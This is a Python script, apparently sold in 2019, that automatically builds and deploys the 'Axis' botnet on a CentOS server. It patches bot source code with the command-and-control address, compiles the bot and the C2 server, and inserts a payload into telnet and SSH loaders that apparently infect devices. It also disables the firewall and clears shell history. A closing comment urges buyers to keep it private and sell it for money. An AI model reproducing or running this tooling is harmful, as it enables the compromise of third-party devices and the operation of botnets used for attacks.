#!/usr/bin/python
#Axis Auto-Builder for Centos by Tragedy
 
import sys
import time
import subprocess
import warnings
import fileinput
 
if len(sys.argv) < 5:
    print("\x1b[31m[SYNTAX ERROR]\r\n Usage: python %s [IP] [BINSPREFIX] [BOTPORT] [CNCPORT]\x1b[0m" % sys.argv[0])
    sys.exit()
 
hst = sys.argv[1]
prf = sys.argv[2]
bp = sys.argv[3]
cp = sys.argv[4]
 
def run(cmd):
    subprocess.call(cmd, shell=True)
 
print ("\x1b[1;36m[+] Welcome to \x1b[1;31mAxis \x1b[1;36m[+]")
print ("\x1b[1;36m[+] Simply Load All \x1b[1;31mAxis \x1b[1;36mFiles Into \x1b[1;31m/root/")
print ("\x1b[1;36m[+] No Need To Change Anything In Them")
raw_input ("\x1b[1;36m[+] When All Files Are Loaded, Press Enter to Start Building...")
 
print ("\r\n\x1b[1;31m        Axis - Auto-Build Process Initiated...\r\n")
time.sleep(2)
 
#Typesizes
print ("\x1b[1;36m[+] Changing Maximum File Descriptor Size...")
try:
    fdsize = open("/usr/include/bits/typesizes.h","r").readlines()
    fdsizew = open("/usr/include/bits/typesizes.h","w").write("")
    for line in fdsize:
        line = line.replace("1024","1000000")
        fdsizew = open("/usr/include/bits/typesizes.h","a").write(line)
    print ("\x1b[1;36m[\x1b[32mDONE\x1b[1;36m] Maximum File Descriptor Size Changed Successfully...")
    time.sleep(2)
except:
    pass

#Depos
print ("\x1b[1;36m[+] Installing Packages and Dependencies...\x1b[0m")
time.sleep(1)
run ("yum update -y; yum install wget python python-paramiko gcc nano screen httpd php bzip2 libssh2 libssh2-devel -y; service httpd start; ulimit -n 99999")
print ("\x1b[1;36m[\x1b[32mDONE\x1b[1;36m] Packages/Dependencies Installed...")
 
#Bot
print ("\x1b[1;36m[+] Compiling Axis Bot...\x1b[0m")
time.sleep(2)
 
hstc = hst.split('.', 4)
addr1 = hstc[0]
addr2 = hstc[1]
addr3 = hstc[2]
addr4 = hstc[3]
 
old1 = "hacks[] "
new1 = "int hacks[] = {"+ addr1 +"};\n"
x = fileinput.input(files="/root/AXB/main.c", inplace=1)
for line in x:
    if old1 in line:
        line = new1
    print line,
x.close()
old2 = "hacks2[] "
new2 = "int hacks2[] = {"+ addr2 +"};\n"
x = fileinput.input(files="/root/AXB/main.c", inplace=1)
for line in x:
    if old2 in line:
        line = new2
    print line,
x.close()
old3 = "hacks3[] "
new3 = "int hacks3[] = {"+ addr3 +"};\n"
x = fileinput.input(files="/root/AXB/main.c", inplace=1)
for line in x:
    if old3 in line:
        line = new3
    print line,
x.close()
old4 = "hacks4[] "
new4 = "int hacks4[] = {"+ addr4 +"};\n"
x = fileinput.input(files="/root/AXB/main.c", inplace=1)
for line in x:
    if old4 in line:
        line = new4
    print line,
x.close()
old5 = "axis_bp "
new5 = "int axis_bp = "+ bp +";\n"
x = fileinput.input(files="/root/AXB/main.c", inplace=1)
for line in x:
    if old5 in line:
        line = new5
    print line,
x.close()
run ("chmod 777 *; python Axis.py fff "+ hst +" "+ prf +"; rm -rf AXB; rm -rf Axis.py; rm -rf cross-compiler-*")
print ("\x1b[1;36m[\x1b[32mDONE\x1b[1;36m] Axis Bot Compiled...")

#Loader
print ("\x1b[1;36m[+] Setting Up Loader...\x1b[0m")
payload = open('/root/Loader/PAYLOAD.txt').read()
old6 = "cmd="
new6 = "cmd=\""+payload+"\"\n"
x = fileinput.input(files="/root/Loader/TragicTEL.py", inplace=1)
for line in x:
    if old6 in line:
        line = new6
    print line,
x.close()
old7 = "cmd="
new7 = "cmd =\""+payload+"\"\n"
x = fileinput.input(files="/root/Loader/TragicSSH.py", inplace=1)
for line in x:
    if old7 in line:
        line = new7
    print line,
x.close()
run ("cd /root/Loader/; chmod 777 *; gcc -o Loader Loader.c -w; rm -rf Loader.c; cd")
print ("\x1b[1;36m[\x1b[32mDONE\x1b[1;36m] Loader Setup Successfully...")
 
#CNC
raw_input ("\x1b[1;36mPress Enter to Build CNC - Detach with CNTRL+A+D Afterwards...\x1b[0m")
old8 = "#define PORT "
new8 = "#define PORT "+ cp +"\n"
x = fileinput.input(files="/root/Axis.c", inplace=1)
for line in x:
    if old8 in line:
        line = new8
    print line,
x.close()
old9 = "char *api_host "
new9 = "char *api_host = \""+ hst +"\" ; //Where IPLookup API Is Hosted\n"
x = fileinput.input(files="/root/Axis.c", inplace=1)
for line in x:
    if old9 in line:
        line = new9
    print line,
x.close()
run ("chmod 777 *; gcc -o C2 Axis.c -pthread -w; rm -rf Axis.c AXHDRS; iptables -F; service iptables stop; screen -S Axis ./C2 "+ bp +" 1; mv iplookup.php /var/www/html; service httpd restart; restorecon -r /var/www/html/; history -c")
 
print ("\x1b[1;36m[+] Axis Built Successfully [+]")
print ("\x1b[1;36m[\x1b[33m!\x1b[1;36m] To \x1b[33mView \x1b[1;36mCNC Screen: \x1b[33mscreen -xS Axis \x1b[1;36m[\x1b[33m!\x1b[1;36m]")
print ("\x1b[1;36m[\x1b[33m!\x1b[1;36m] To \x1b[33mReScreen \x1b[1;36mCNC: \x1b[33mscreen -S Axis ./C2 "+bp+" 1 \x1b[1;36m[\x1b[33m!\x1b[1;36m]")
print ("\r\n            \x1b[1;36m[RyM Gang]\r\n\x1b[0m")
exit(1)

#    Modifying This Code Is Permitted, However, Ripping Code From This/Removing Credits Is The Lowest Of The Low.
#    Sales Release 10/5/2019
#    KEEP IT PRIVATE; I'd Rather You Sell It Than Give It Away Or Post Somewhere. We're All Here To Make Money!
#    Much Love 
#        - Tragedy